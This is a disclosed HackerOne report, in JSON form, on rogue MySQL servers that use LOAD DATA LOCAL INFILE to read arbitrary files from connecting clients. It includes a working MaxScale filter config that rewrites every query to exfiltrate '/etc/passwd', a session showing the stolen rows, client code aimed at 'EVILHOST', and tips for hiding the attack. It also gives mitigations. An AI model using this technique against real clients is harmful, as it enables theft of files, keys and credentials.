{"id":171593,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzE1OTM=","url":"https://hackerone.com/reports/171593","title":"Malicious Server can force read any file on clients system with default configuration in MySQL Clients","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-09-24T02:19:09.078Z","submitted_at":"2016-09-24T02:19:09.078Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tarq","url":"/tarq","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/603/380999741fc580b7f66dbe475a2b8f90aa4da512_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":20,"url":"https://hackerone.com/internet","handle":"internet","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"The Internet","twitter_handle":null,"website":"","about":"Hack all the things."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T23:49:28.674Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T23:49:24.064Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Although it is [documented](http://dev.mysql.com/doc/refman/5.7/en/load-data-local.html) that the default binary distributions of MySQL/MariaDB/Percona all seem to be compiled with allow local infile enabled, the warning is misleading.\n\n\u003e The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server's choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access.\n\n\nWhile this is true, what is not stated is that the malicious server can reply with a request to load data to _any_ query, not just manipulating a legitimate `LOAD DATA LOCAL INFILE` request from the Client. A simple example of such an attack can be done using MaxScale as an evil proxy with the following configuration:\n\n```\n[EvilFilter]\ntype=filter\nmodule=regexfilter\noptions=ignorecase\nmatch=.*\nreplace=LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test.loot;\n```\n\nThis will replace any incoming query with a LOAD DATA query that will be sent to the backend. Upon receiving this query the backend sends the [LOCAL_INFILE_REQUEST](https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request) packet which will be processed by the client.\n\n### Example attack (MySQL CLI Client):\n```\n# Evil server:\nMariaDB [(none)]\u003e select * from test.loot;\nEmpty set (0.00 sec)\n\n# Target server:\nmysql -utest -h EVILHOST test\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 30985\nServer version: 10.0.0 beta-2.0.0-maxscale\n\nCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMySQL [test]\u003e\n\n# And now back on the evil server, note that no interaction was required on behalf of the target client beyond simply connecting:\nMariaDB [(none)]\u003e select * from test.loot LIMIT 5;\n+-------------------------------------------------+\n| line                                            |\n+-------------------------------------------------+\n| root:x:0:0:root:/root:/bin/bash                 |\n| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin |\n| bin:x:2:2:bin:/bin:/usr/sbin/nologin            |\n| sys:x:3:3:sys:/dev:/usr/sbin/nologin            |\n| sync:x:4:65534:sync:/bin:/bin/sync              |\n+-------------------------------------------------+\n5 rows in set (0.00 sec)\n````\n\nThe evil server can now read any file with the permissions of the client process permissions. If targeting a system administrator, this may include stealing bash histories or SSH private keys. You can also learn more information about your target by grabbing `/proc/self/environ`.\n\n\n### Example Attack (php_mysqli + php_mysqlnd):\n\n````\n$mysqli = mysqli_connect('EVILHOST', 'test', null, 'test', 3306);\n$result = mysqli_query($mysqli, \"SELECT 1\");\n$result = mysqli_fetch_assoc($mysqli, $result);\n````\n\n### Other Clients\n\nOther vulnerable clients include:\n\n- php-mysql (without open basedir)\n- php-mysqli (with and without php-mysqlnd)\n- node-mysql\n- any library using libmysql included in the binary distributions compiled with ENABLE_LOCAL_INFILE\n\n### Potential Attack Vectors\n\n- Installers for Wordpress, Drupal, vBulletin, etc\n- Any applications that allow integration with remote MySQL servers (i.e Zapier, though they specifically aren't vulnerable)\n- MITM attacks\n- DNS Cache poisoning\n- Domain/Type Squatting\n- Exposed administration tools such as PHPMyAdmin, although you could just exeute the query yourself in that case :)\n- Good ol' social engineering\n\n### Improving the attack\n- A smarter evil server could accept any username/password/database name as valid\n- Evil server could take steps to hide the attack by manipulating the packets in the result\n- Evil server could be changed to not show the table where the stolen information is stored (beyond only giving the attack user INSERT privileges, it could simply not tell the client about that table)\n\n\n### Mitigation\n\n- Use `local-infile=0` in the `[client]` section of your `/etc/my.cnf` or `~/.my.cnf`\n- Make sure your clients are configured to unset that flag if they do not read from configuration files\n\n\n### Why is this news if it's documented?\n\n- The documentation does not explain the full scope of possible attacks and may lead people to believe they are safe if they never execute a LOAD DATA LOCAL INFILE query\n- With an evil server, any query executed can trigger the payload as soon as the client processes the reply. Even if we do not control the queries coming from the application\n\n#### Recommendations\n\n- Insecure defaults should be removed and going forward a clear error message such as \"You must use --local-infile in order to use this feature\" should be used to guide those who depend on this features\n- Tools such as mysqlimport keeping this default is acceptable, the mysql client should not\n- Any client library implementations should disable this flag by default\n\n\nAll tests were done on:\n- Debian 8\n- CentOS 7 \n- WHM/cPanel + EasyApache Builds on CentOS 7\n\nWith the latest packages available from their respective repos as well as the versions available from the MariaDB repos.\n\nOnly default configurations were used, there were no modifications to the configuration files on the target servers. ","vulnerability_information_html":"\u003cp\u003eAlthough it is \u003ca href=\"/redirect?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fload-data-local.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edocumented\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that the default binary distributions of MySQL/MariaDB/Percona all seem to be compiled with allow local infile enabled, the warning is misleading.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThe transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server\u0026#39;s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eWhile this is true, what is not stated is that the malicious server can reply with a request to load data to \u003cu\u003eany\u003c/u\u003e query, not just manipulating a legitimate \u003ccode\u003eLOAD DATA LOCAL INFILE\u003c/code\u003e request from the Client. A simple example of such an attack can be done using MaxScale as an evil proxy with the following configuration:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[EvilFilter]\ntype=filter\nmodule=regexfilter\noptions=ignorecase\nmatch=.*\nreplace=LOAD DATA LOCAL INFILE \u0026#39;/etc/passwd\u0026#39; INTO TABLE test.loot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis will replace any incoming query with a LOAD DATA query that will be sent to the backend. Upon receiving this query the backend sends the \u003ca href=\"/redirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Finternals%2Fen%2Fcom-query-response.html%23packet-Protocol%3A%3ALOCAL_INFILE_Request\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLOCAL_INFILE_REQUEST\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e packet which will be processed by the client.\u003c/p\u003e\n\n\u003ch3 id=\"example-attack-mysql-cli-client\"\u003eExample attack (MySQL CLI Client):\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# Evil server:\nMariaDB [(none)]\u0026gt; select * from test.loot;\nEmpty set (0.00 sec)\n\n# Target server:\nmysql -utest -h EVILHOST test\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 30985\nServer version: 10.0.0 beta-2.0.0-maxscale\n\nCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.\n\nType \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement.\n\nMySQL [test]\u0026gt;\n\n# And now back on the evil server, note that no interaction was required on behalf of the target client beyond simply connecting:\nMariaDB [(none)]\u0026gt; select * from test.loot LIMIT 5;\n+-------------------------------------------------+\n| line                                            |\n+-------------------------------------------------+\n| root:x:0:0:root:/root:/bin/bash                 |\n| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin |\n| bin:x:2:2:bin:/bin:/usr/sbin/nologin            |\n| sys:x:3:3:sys:/dev:/usr/sbin/nologin            |\n| sync:x:4:65534:sync:/bin:/bin/sync              |\n+-------------------------------------------------+\n5 rows in set (0.00 sec)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe evil server can now read any file with the permissions of the client process permissions. If targeting a system administrator, this may include stealing bash histories or SSH private keys. You can also learn more information about your target by grabbing \u003ccode\u003e/proc/self/environ\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"example-attack-php_mysqli-php_mysqlnd\"\u003eExample Attack (php_mysqli + php_mysqlnd):\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$mysqli = mysqli_connect(\u0026#39;EVILHOST\u0026#39;, \u0026#39;test\u0026#39;, null, \u0026#39;test\u0026#39;, 3306);\n$result = mysqli_query($mysqli, \u0026quot;SELECT 1\u0026quot;);\n$result = mysqli_fetch_assoc($mysqli, $result);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"other-clients\"\u003eOther Clients\u003c/h3\u003e\n\n\u003cp\u003eOther vulnerable clients include:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ephp-mysql (without open basedir)\u003c/li\u003e\n\u003cli\u003ephp-mysqli (with and without php-mysqlnd)\u003c/li\u003e\n\u003cli\u003enode-mysql\u003c/li\u003e\n\u003cli\u003eany library using libmysql included in the binary distributions compiled with ENABLE_LOCAL_INFILE\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"potential-attack-vectors\"\u003ePotential Attack Vectors\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eInstallers for Wordpress, Drupal, vBulletin, etc\u003c/li\u003e\n\u003cli\u003eAny applications that allow integration with remote MySQL servers (i.e Zapier, though they specifically aren\u0026#39;t vulnerable)\u003c/li\u003e\n\u003cli\u003eMITM attacks\u003c/li\u003e\n\u003cli\u003eDNS Cache poisoning\u003c/li\u003e\n\u003cli\u003eDomain/Type Squatting\u003c/li\u003e\n\u003cli\u003eExposed administration tools such as PHPMyAdmin, although you could just exeute the query yourself in that case :)\u003c/li\u003e\n\u003cli\u003eGood ol\u0026#39; social engineering\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"improving-the-attack\"\u003eImproving the attack\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eA smarter evil server could accept any username/password/database name as valid\u003c/li\u003e\n\u003cli\u003eEvil server could take steps to hide the attack by manipulating the packets in the result\u003c/li\u003e\n\u003cli\u003eEvil server could be changed to not show the table where the stolen information is stored (beyond only giving the attack user INSERT privileges, it could simply not tell the client about that table)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"mitigation\"\u003eMitigation\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eUse \u003ccode\u003elocal-infile=0\u003c/code\u003e in the \u003ccode\u003e[client]\u003c/code\u003e section of your \u003ccode\u003e/etc/my.cnf\u003c/code\u003e or \u003ccode\u003e~/.my.cnf\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eMake sure your clients are configured to unset that flag if they do not read from configuration files\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"why-is-this-news-if-it-s-documented\"\u003eWhy is this news if it\u0026#39;s documented?\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe documentation does not explain the full scope of possible attacks and may lead people to believe they are safe if they never execute a LOAD DATA LOCAL INFILE query\u003c/li\u003e\n\u003cli\u003eWith an evil server, any query executed can trigger the payload as soon as the client processes the reply. Even if we do not control the queries coming from the application\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch4 id=\"recommendations\"\u003eRecommendations\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003eInsecure defaults should be removed and going forward a clear error message such as \u0026quot;You must use --local-infile in order to use this feature\u0026quot; should be used to guide those who depend on this features\u003c/li\u003e\n\u003cli\u003eTools such as mysqlimport keeping this default is acceptable, the mysql client should not\u003c/li\u003e\n\u003cli\u003eAny client library implementations should disable this flag by default\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAll tests were done on:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eDebian 8\u003c/li\u003e\n\u003cli\u003eCentOS 7 \u003c/li\u003e\n\u003cli\u003eWHM/cPanel + EasyApache Builds on CentOS 7\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eWith the latest packages available from their respective repos as well as the versions available from the MariaDB repos.\u003c/p\u003e\n\n\u003cp\u003eOnly default configurations were used, there were no modifications to the configuration files on the target servers. \u003c/p\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T23:49:24.161Z","allow_singular_disclosure_after":-35614297.01866363,"singular_disclosure_allowed":true,"vote_count":5,"voters":["mashoud1122","base_64","smodnix","spetr0x","vinay_s"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1213691,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note: This would affect MariaDB, MySQL, and in theory Percona packages","markdown_message":"\u003cp\u003eNote: This would affect MariaDB, MySQL, and in theory Percona packages\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-24T03:06:13.280Z","updated_at":"2016-09-24T03:06:21.496Z","actor":{"username":"tarq","cleared":false,"url":"/tarq","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/603/380999741fc580b7f66dbe475a2b8f90aa4da512_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1709743,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"hey @tarq - Thanks for the write-up on this behavior. But the panel has decided that it isn't eligible given the exploitation constraints and available mitigations. (we also had a few duplicate submissions of this behavior)","markdown_message":"\u003cp\u003ehey \u003ca href=\"/tarq\"\u003e@tarq\u003c/a\u003e - Thanks for the write-up on this behavior. But the panel has decided that it isn\u0026#39;t eligible given the exploitation constraints and available mitigations. (we also had a few duplicate submissions of this behavior)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-30T14:55:02.353Z","updated_at":"2017-05-30T14:55:02.353Z","actor":{"url":"/internet","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"The Internet"}},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1709744,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T14:55:08.340Z","updated_at":"2017-05-30T14:55:08.340Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"tarq","url":"/tarq"},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6028953,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T23:49:24.082Z","updated_at":"2019-10-13T23:49:24.082Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6293066,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T23:49:28.692Z","updated_at":"2019-11-12T23:49:28.692Z","actor":{"url":"/internet","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"The Internet"}},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}